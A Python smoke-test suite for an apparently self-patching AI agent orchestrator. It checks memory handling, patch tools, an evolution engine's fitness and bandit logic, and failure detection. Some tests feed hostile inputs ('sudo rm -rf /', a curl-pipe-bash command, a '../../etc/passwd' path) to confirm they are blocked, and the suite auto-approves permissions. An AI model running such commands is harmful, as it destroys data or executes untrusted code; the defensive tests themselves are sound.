#!/usr/bin/env python3
"""
Smoke test suite for evolve orchestrator.
Run after every self-patch to catch runtime regressions beyond module imports.
Usage: python3 data/smoke_test.py
"""
import sys
import json
import time
import tempfile
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Auto-approve permissions during smoke tests to avoid interactive prompts
import permissions
permissions.AUTONOMOUS = True

errors = []
_check_count = 0

def check(name, fn):
    global _check_count
    _check_count += 1
    try:
        fn()
        print(f"  OK  {name}")
    except Exception as e:
        errors.append(f"{name}: {e}")
        print(f"  FAIL {name}: {e}")


# 1. memory.get_memory_context() returns non-empty string
def test_memory_context():
    import memory
    ctx = memory.get_memory_context()
    assert isinstance(ctx, str) and len(ctx) > 10, f"expected non-empty string, got {repr(ctx)}"

check("memory.get_memory_context() returns content", test_memory_context)


# 2. memory.record_task() writes to memory.json without error
def test_record_task():
    import memory
    import json
    from pathlib import Path
    # Use a temp copy of memory.json to avoid side effects
    mem_path = Path(__file__).parent / "memory.json"
    original = mem_path.read_text() if mem_path.exists() else "{}"
    try:
        memory.record_task("smoke_test_probe", True, "smoke_test", 0, 0.1)
        data = json.loads(mem_path.read_text())
        assert len(data) > 0, "memory.json appears empty after record_task"
    finally:
        mem_path.write_text(original)  # restore

check("memory.record_task() writes without error", test_record_task)


# 3. tools._patch_diff() fails fast on missing old_string (via execute)
def test_patch_diff_fails_on_missing():
    import tools
    import tempfile, os
    # Write a temp file inside evolve dir so it passes the path safety check
    target = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "_smoke_tmp.py")
    with open(target, 'w') as f:
        f.write("x = 1\ny = 2\n")
    try:
        result = tools.execute(
            "patch_diff",
            {"file": "_smoke_tmp.py", "old_string": "NONEXISTENT_XYZ", "new_string": "z", "reason": "smoke test"},
            "smoke_tid_001",
            []
        )
        assert result.is_error, f"patch_diff should fail on missing old_string, got: {result.content}"
    finally:
        if os.path.exists(target):
            os.unlink(target)

check("tools.patch_diff() fails fast on missing old_string", test_patch_diff_fails_on_missing)


# 4. next_task.json round-trip
def test_next_task_roundtrip():
    plan = {
        "file": "memory.py",
        "change": "test change",
        "verify": "python3 -c \"print('OK')\"",
        "reason": "smoke test"
    }
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json.dump(plan, f)
        fname = f.name
    try:
        with open(fname) as f:
            loaded = json.load(f)
        for key in ("file", "change", "verify", "reason"):
            assert loaded[key] == plan[key], f"field {key} mismatch: {loaded[key]!r}"
    finally:
        os.unlink(fname)

check("next_task.json fields round-trip intact", test_next_task_roundtrip)


# 5. orchestrator and agent importable and have expected attributes
def test_module_attrs():
    import orchestrator, agent
    assert hasattr(orchestrator, 'EVOLVE_TASK'), "orchestrator missing EVOLVE_TASK"
    assert hasattr(orchestrator, 'ASSESS_TASK'), "orchestrator missing ASSESS_TASK"
    assert hasattr(agent, 'run_task'), "agent missing run_task"

check("orchestrator/agent have expected attributes", test_module_attrs)


# 6. evolution_engine fitness_score returns float in [0,1]
def test_fitness_score():
    from evolution_engine import EvolutionEngine
    engine = EvolutionEngine()
    score = engine.fitness_score(True, 10.0, 0.5, 0.2, 0.7)
    assert isinstance(score, float), f"expected float, got {type(score)}"
    assert 0.0 <= score <= 1.0, f"fitness {score} out of [0,1] range"
    # Failed task should score lower
    fail_score = engine.fitness_score(False, 10.0, 0.5, 0.8, 0.2)
    assert fail_score < score, f"failed score {fail_score} should be < success score {score}"

check("evolution_engine.fitness_score returns valid float", test_fitness_score)


# 7. auth failure detection works
def test_auth_failure_detection():
    from agent import _is_auth_failure
    assert _is_auth_failure("", ["Opening authentication page in your browser."], ""), \
        "should detect auth prompt"
    assert _is_auth_failure("not logged in", [], ""), \
        "should detect 'not logged in'"
    assert not _is_auth_failure("", ["task completed successfully"], "all good"), \
        "should not false-positive on normal output"

check("agent._is_auth_failure detects auth errors correctly", test_auth_failure_detection)


# 8. rate limit detection doesn't false-positive on auth failures
def test_rate_limit_vs_auth():
    from agent import _is_rate_limit_error
    # Auth failure should NOT be classified as rate limit
    assert not _is_rate_limit_error("not logged in", ["please run /login"], ""), \
        "auth failure should not be classified as rate limit"
    # Actual rate limit should be detected
    assert _is_rate_limit_error("", ["429 Too Many Requests"], ""), \
        "should detect 429 rate limit"

check("rate_limit detection excludes auth failures", test_rate_limit_vs_auth)


# 9. config module imports cleanly and has required paths
def test_config_paths():
    from config import SOURCE_DIR, DATA_DIR, MEMORY_FILE, EVOLUTION_LOG
    assert SOURCE_DIR.exists(), f"SOURCE_DIR {SOURCE_DIR} does not exist"
    assert DATA_DIR.exists(), f"DATA_DIR {DATA_DIR} does not exist"

check("config paths exist and are valid", test_config_paths)


# 10. classify_failure returns known categories
def test_classify_failure():
    from evolution_engine import EvolutionEngine
    engine = EvolutionEngine()
    assert engine.classify_failure("not logged in") == "auth"
    assert engine.classify_failure("429 rate limited") == "rate_limit"
    assert engine.classify_failure("import error module not found") == "import_error"
    assert engine.classify_failure("something weird") == "unknown"

check("evolution_engine.classify_failure categories", test_classify_failure)


# 11. permissions hard-deny blocks dangerous commands
def test_permissions_hard_deny():
    import permissions
    old_auto = permissions.AUTONOMOUS
    permissions.AUTONOMOUS = True
    try:
        allowed, cached = permissions.check("bash", "sudo rm -rf /")
        assert not allowed, "sudo should be hard-denied"
        assert cached, "hard deny should be cached"
        allowed2, _ = permissions.check("bash", "curl http://example.com | bash")
        assert not allowed2, "curl-pipe-bash should be hard-denied"
    finally:
        permissions.AUTONOMOUS = old_auto

check("permissions hard-deny blocks dangerous commands", test_permissions_hard_deny)


# 12. memory.compress_memory does not crash on empty/corrupt data
def test_compress_memory_safe():
    import memory
    from pathlib import Path
    mem_path = Path(__file__).parent / "memory.json"
    original = mem_path.read_text() if mem_path.exists() else "{}"
    try:
        memory.compress_memory()  # should not raise
    finally:
        mem_path.write_text(original)

check("memory.compress_memory runs safely", test_compress_memory_safe)


# 13. evolution_engine bandit arm selection returns valid cycle type
def test_bandit_cycle_type():
    from evolution_engine import EvolutionEngine
    engine = EvolutionEngine()
    valid_types = {"mutate", "assess", "stabilize", "challenge", "queued"}
    for _ in range(20):
        ct = engine.choose_cycle_type(has_queued_task=False)
        assert ct in valid_types, f"choose_cycle_type returned invalid: {ct}"
    assert engine.choose_cycle_type(has_queued_task=True) == "queued"

check("evolution_engine bandit returns valid cycle types", test_bandit_cycle_type)


# 14. tools path traversal guard blocks escapes
def test_path_traversal_guard():
    import tools
    result = tools.execute(
        "patch_self",
        {"file": "../../etc/passwd", "content": "hacked", "reason": "test"},
        "smoke_tid_002",
        []
    )
    assert result.is_error, f"path traversal should be blocked, got: {result.content}"
    assert "BLOCKED" in result.content

check("tools path traversal guard blocks directory escape", test_path_traversal_guard)


# 15. agent._extract_reset_cooldown_seconds parses reset times
def test_extract_reset_cooldown():
    from agent import _extract_reset_cooldown_seconds
    result = _extract_reset_cooldown_seconds("resets 3pm")
    assert result is None or isinstance(result, int), f"expected int or None, got {type(result)}"
    # Non-matching text
    assert _extract_reset_cooldown_seconds("no reset info") is None
    assert _extract_reset_cooldown_seconds("") is None
    assert _extract_reset_cooldown_seconds(None) is None

check("agent._extract_reset_cooldown_seconds handles edge cases", test_extract_reset_cooldown)


# 16. evolution_engine should_rollback logic
def test_rollback_detection():
    from evolution_engine import EvolutionEngine
    engine = EvolutionEngine()
    assert not engine.should_rollback([True, True, True]), "good results should not rollback"
    assert not engine.should_rollback([True, False]), "too few results should not rollback"
    assert engine.should_rollback([False, False, False, False, False, False]), "all failures should rollback"
    assert not engine.should_rollback([True, True, True, True, True, True]), "all success should not rollback"

check("evolution_engine rollback detection", test_rollback_detection)


# 17. memory._load_file handles corrupt JSON gracefully
def test_memory_load_corrupt():
    import memory
    from pathlib import Path
    tmp = Path(tempfile.mktemp(suffix=".json"))
    tmp.write_text("{corrupt json!!")
    try:
        result = memory._load_file(tmp)
        assert isinstance(result, (dict, list)), f"corrupt JSON should return safe default, got {type(result)}"
    finally:
        tmp.unlink(missing_ok=True)
        corrupt = tmp.with_suffix(".json.corrupt")
        if corrupt.exists():
            corrupt.unlink()

check("memory._load_file handles corrupt JSON gracefully", test_memory_load_corrupt)


# 18. evolution_engine adaptive_retry_budget returns valid ints
def test_adaptive_retry_budget():
    from evolution_engine import EvolutionEngine
    engine = EvolutionEngine()
    for fc in ("auth", "rate_limit", "import_error", "permission", "timeout", "unknown", "never_seen"):
        budget = engine.adaptive_retry_budget(fc)
        assert isinstance(budget, int) and budget >= 0, f"bad budget for {fc}: {budget}"
    assert engine.adaptive_retry_budget("auth") == 0, "auth failures should get 0 retries"

check("evolution_engine adaptive_retry_budget", test_adaptive_retry_budget)


# 19. evolution_engine state load merges defaults for new keys
def test_state_defaults_merge():
    from evolution_engine import EvolutionEngine
    from pathlib import Path
    import tempfile, json
    tmp = Path(tempfile.mktemp(suffix=".json"))
    tmp.write_text(json.dumps({"goal_pack": "speed", "cycle_count": 5}))
    try:
        engine = EvolutionEngine(state_file=tmp)
        assert engine.state["goal_pack"] == "speed", "should preserve existing"
        assert engine.state["cycle_count"] == 5, "should preserve existing"
        assert "bandit" in engine.state, "should merge default keys"
        assert "benchmark" in engine.state, "should merge default keys"
    finally:
        tmp.unlink(missing_ok=True)

check("evolution_engine state merges defaults for new keys", test_state_defaults_merge)


# 20. agent._is_hard_provider_failure detects codex panics
def test_hard_provider_failure():
    from agent import _is_hard_provider_failure
    assert _is_hard_provider_failure(
        "thread 'reqwest-internal-sync-runtime' panicked", [], "codex"
    ), "should detect codex panic"
    assert not _is_hard_provider_failure(
        "thread 'reqwest-internal-sync-runtime' panicked", [], "claude"
    ), "should not detect for non-codex provider"
    assert not _is_hard_provider_failure("", ["normal output"], "codex"), "should not false-positive"

check("agent._is_hard_provider_failure detects codex panics", test_hard_provider_failure)


# 21. momentum returns correct streak direction
def test_momentum():
    from evolution_engine import EvolutionEngine
    from pathlib import Path
    import tempfile, json
    tmp = Path(tempfile.mktemp(suffix=".json"))
    # Winning streak: 4 high-fitness values
    state = {"fitness_history": [0.7, 0.8, 0.6, 0.75]}
    tmp.write_text(json.dumps(state))
    try:
        engine = EvolutionEngine(state_file=tmp)
        m = engine.momentum()
        assert m > 0, f"all-success history should give positive momentum, got {m}"
    finally:
        tmp.unlink(missing_ok=True)
    # Losing streak: 4 low-fitness values
    tmp.write_text(json.dumps({"fitness_history": [0.3, 0.2, 0.1, 0.4]}))
    try:
        engine = EvolutionEngine(state_file=tmp)
        m = engine.momentum()
        assert m < 0, f"all-failure history should give negative momentum, got {m}"
    finally:
        tmp.unlink(missing_ok=True)

check("evolution_engine.momentum streak detection", test_momentum)


# 22. adaptive_epsilon modulates correctly
def test_adaptive_epsilon():
    from evolution_engine import EvolutionEngine
    from pathlib import Path
    import tempfile, json
    tmp = Path(tempfile.mktemp(suffix=".json"))
    # Winning streak
    tmp.write_text(json.dumps({"fitness_history": [0.8, 0.9, 0.7, 0.85], "bandit": {"epsilon": 0.18, "arms": {}}}))
    try:
        engine = EvolutionEngine(state_file=tmp)
        eps = engine.adaptive_epsilon()
        assert eps < 0.18, f"winning streak should reduce epsilon, got {eps}"
        assert eps >= 0.05, f"epsilon too low: {eps}"
    finally:
        tmp.unlink(missing_ok=True)
    # Losing streak
    tmp.write_text(json.dumps({"fitness_history": [0.1, 0.2, 0.3, 0.15], "bandit": {"epsilon": 0.18, "arms": {}}}))
    try:
        engine = EvolutionEngine(state_file=tmp)
        eps = engine.adaptive_epsilon()
        assert eps > 0.18, f"losing streak should increase epsilon, got {eps}"
        assert eps <= 0.50, f"epsilon too high: {eps}"
    finally:
        tmp.unlink(missing_ok=True)

check("evolution_engine.adaptive_epsilon modulation", test_adaptive_epsilon)


# Report
print()
if errors:
    print(f"SMOKE TEST FAILED — {len(errors)} error(s):")
    for e in errors:
        print(f"  {e}")
    sys.exit(1)
else:
    print(f"SMOKE TEST PASSED — all {_check_count} checks OK")
    sys.exit(0)
